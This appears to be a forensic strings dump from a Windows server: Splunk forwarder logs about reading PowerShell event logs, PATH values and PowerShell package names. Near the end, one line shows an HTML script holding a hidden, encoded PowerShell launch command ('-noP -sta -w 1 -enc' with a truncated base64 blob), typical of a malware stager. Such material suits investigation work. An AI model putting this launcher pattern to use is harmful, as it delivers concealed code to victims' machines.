+	source::C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx||WinEventLog:Windows PowerShell|
+_pathNC:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft.PowerShell.DSC.Deployment-Group-servercommon-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Windows.v2.Powershell
+Microsoft-Windows-FailoverCluster-Mgmt-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|Microsoft-Windows-FailoverCluster-PowerShell-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+Microsoft.PowerShell.DSC.Deployment-Group-admin-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+08-22-2023 11:21:20.463 -0700 INFO  TailReader [3744 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx' has stopped changing, will read it now.
+08-22-2023 11:21:20.463 -0700 INFO  ArchiveProcessor [3572 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
+08-22-2023 11:21:20.463 -0700 INFO  ArchiveProcessor [3572 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx
+08-22-2023 11:21:10.403 -0700 INFO  TailReader [3744 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx' updated less than 10000ms ago, will not read it until it stops changing. File size=69632
+08-22-2023 11:21:09.862 -0700 INFO  WinEventLogChannel [2072 WinEventLogInputProcessor] - getBookMark: No checkpoint file available file = C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\persistentstorage\WinEventLog\C__Windows_System32_Winevt_Logs_Microsoft-Windows-PersistentMemory-Nvdimm_4Operational_evtx_checkpoint, file = C:\Program Files\SplunkUniversalForwarder\var\lib\spl\var\lib\splunk\persistentstorage\WinEventLog\C__Windows_System32_Winevt_Logs_Microsoft-Windows-PowerShell_4Operational_evtx_checkpoint, file = C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\WinEventLog\C__Windows_System32_Winevt_Logs_Microsoft-Windows-PowerShell_4Operational_evtx
+08-22-2023 11:21:09.641 -0700 INFO  WinEventLogInputProcessor [2072 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-22-2023 11:21:09.815 -0700 INFO  WinEventLogInputProcessor [2072 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='11' with empty_msg='0'.
+08-22-2023 11:21:09.625 -0700 INFO  WinEventLogChannel [2072 WinEventLogInputProcessor] - getBookMark: No checkpoint file available file = C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\persistentstorage\WinEventLog\C__Windows_System32_Winevt_Logs_Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager_4Operational_evtx_checkpoint, file = C:\Program Files\SplunkUniversalForwarder\var\lib\splunk\modinputs\WinEventLog\C__Windows_System32_Winevt_Logs_Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager_4Operational_evtx
+08-22-2023 11:21:09.625 -0700 INFO  WinEventLogInputProcessor [2072 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx'
+08-22-2023 11:21:09.641 -0700 INFO  WinEventLogInputProcessor [2072 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell-DesiredStateConfiguration-FileDownloadManager%4Operational.evtx': total_events='0' with empty_msg='0'.
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-Network-Security-MPSSVC-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Network-Security-MPSSVC-PowerShell-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01811~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201820~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+$SPLUNK_HOME\bin\splunk-powershell.exe
+m32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:10:47.252 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:10:47.252 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:10:47.252 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:10:47.431 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='8' with empty_msg='0'.
+08-30-2024 16:10:47.431 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+ows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='3' with empty_msg='0'.
+08-30-2024 16:19:02.936 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:19:03.021 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='7' with empty_msg='0'.
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+ws\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
+Microsoft-Windows-FailoverCluster-Mgmt-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|Microsoft-Windows-FailoverCluster-PowerShell-Nano-Package~31bf3856ad364e35~amd64~en-US~10.0.17763.1.cat|!
+Microsoft-Windows-iSCSITarget-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-FailoverCluster-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Windows.v2.Powershell
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Microsoft-Windows-Network-Security-MPSSVC-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Network-Security-MPSSVC-PowerShell-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01811~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201820~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+08-30-2024 16:19:01.953 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx' has stopped changing, will read it now.
+08-30-2024 16:19:01.953 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:19:01.953 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx
+08-30-2024 16:19:01.953 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx'
+Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-PowerShell-V2-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-PowerShell-DSC-PullServer-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+08-30-2024 16:00:27.285 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.320, eps=0.229, kb=19.525, ev=14, avg_age=5.857, max_age=42, interval_sec=60
+08-30-2024 16:00:27.285 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.320, eps=0.229, kb=19.525, ev=14, avg_age=5.857, max_age=42, interval_sec=60
+08-30-2024 16:11:38.500 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.132, eps=0.163, kb=8.047, ev=10, avg_age=38.900, max_age=41, interval_sec=60
+08-30-2024 16:11:38.500 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.130, eps=0.131, kb=7.979, ev=8, avg_age=38.500, max_age=42, interval_sec=60
+08-30-2024 16:11:38.500 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.132, eps=0.163, kb=8.047, ev=10, avg_age=38.900, max_age=41, interval_sec=60
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+MICROSOFT.POWERSHELL.DSC.DEPLOYMENT-GROUP-SERVERCOMMON-PACKAGE~31BF3856AD364E35~AMD64~EN-US~10.0.17763.1
+  <Bookmark Channel='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' RecordId='95' IsCurrent='true'/>
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPower
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+  <Bookmark Channel='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' RecordId='95' IsCurrent='true'/>
+Microsoft.PowerShell.DSC.Deployment-Group-admin-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+_pathNC:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+LogName=Microsoft-Windows-PowerShell/Operational
+SourceName=Microsoft-Windows-PowerShell
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-V2-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat
+  <description>PowerShell</description>
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+Microsoft-NanoServer-Core-FailoverClusterSet-Powershell-Package~31bf3856ad364e35~amd64~en-US~0.0.0.0
+08-30-2024 16:01:28.291 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.013, eps=0.016, kb=0.798, ev=1, avg_age=34.000, max_age=34, interval_sec=60
+08-30-2024 16:01:28.291 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=1.076, eps=0.377, kb=65.649, ev=23, avg_age=19.217, max_age=20, interval_sec=60
+08-30-2024 16:01:28.291 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.013, eps=0.016, kb=0.798, ev=1, avg_age=34.000, max_age=34, interval_sec=60
+08-30-2024 16:01:28.291 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=1.076, eps=0.377, kb=65.649, ev=23, avg_age=19.217, max_age=20, interval_sec=60
+08-30-2024 16:11:38.500 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.130, eps=0.131, kb=7.979, ev=8, avg_age=38.500, max_age=42, interval_sec=60
+08-30-2024 16:01:28.291 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=1.076, eps=0.377, kb=65.649, ev=23, avg_age=19.217, max_age=20, interval_sec=60
+Microsoft-Windows-PowerShell-ServerCore-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-PowerShell-ServerCore-WOW64-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+Microsoft-Windows-PowerShell
+hsPowerShellh
+powershell_ise.exe
+wsPowerShell
+08-30-2024 16:00:27.285 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=0.320, eps=0.229, kb=19.525, ev=14, avg_age=5.857, max_age=42, interval_sec=60
+08-30-2024 16:00:27.285 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=0.320, eps=0.229, kb=19.525, ev=14, avg_age=5.857, max_age=42, interval_sec=60
+%\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+%systemroot%\system32\windowspowershell\v1.0\powershell_ise.exe
+Microsoft-Windows-PowerShell-ISE-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-Networking-RemoteAccess-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-ActiveDirectory-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-Windows-Networking-RemoteAccess-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+Microsoft-ActiveDirectory-PowerShell-Package~31bf3856ad364e35~amd64~~10.0.17763.1
+08-30-2024 16:14:33.638 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:14:34.865 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='5' with empty_msg='0'.
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+ows Event Log 'C:\Windows\System32\Winevt\Logs\Windows PowerShell.evtx': total_events='3' with empty_msg='0'.
+08-30-2024 16:19:02.936 -0700 INFO  TailReader [2784 tailreader0] - Archive file='C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx' has stopped changing, will read it now.
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Handling file=C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  ArchiveProcessor [3040 archivereader] - Processing windows event log file C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+08-30-2024 16:19:02.936 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx'
+08-30-2024 16:19:03.021 -0700 INFO  WinEventLogInputProcessor [3068 WinEventLogInputProcessor] - main-thread: Finished processing existing Windows Event Log 'C:\Windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx': total_events='7' with empty_msg='0'.
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\windows powershell.evtx", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+08-30-2024 16:08:35.476 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:windows powershell", kbps=0.071, eps=0.016, kb=4.333, ev=1, avg_age=40.000, max_age=40, interval_sec=60
+Path=C:\Program Files (x86)\Mozilla Firefox;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\alice\AppData\Local\Microsoft\WindowsApps;
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+<html><head><script>var c= 'powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMA
+PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+Microsoft-Windows-PowerShell-ISE-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
+08-30-2024 15:58:25.261 -0700 INFO  Metrics - group=per_source_thruput, series="c:\windows\system32\winevt\logs\microsoft-windows-powershell%4operational.evtx", kbps=1.170, eps=0.344, kb=71.400, ev=21, avg_age=17.524, max_age=23, interval_sec=60
+08-30-2024 15:58:25.261 -0700 INFO  Metrics - group=per_sourcetype_thruput, series="wineventlog:microsoft-windows-powershell/operational", kbps=1.170, eps=0.344, kb=71.400, ev=21, avg_age=17.524, max_age=23, interval_sec=60
+Microsoft-Windows-PowerShell-ISE-Package~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package01612~31bf3856ad364e35~amd64~~10.0.17763.1.cat|Microsoft-Windows-Server-Features-Package0201621~31bf3856ad364e35~amd64~~10.0.17763.1.cat|!
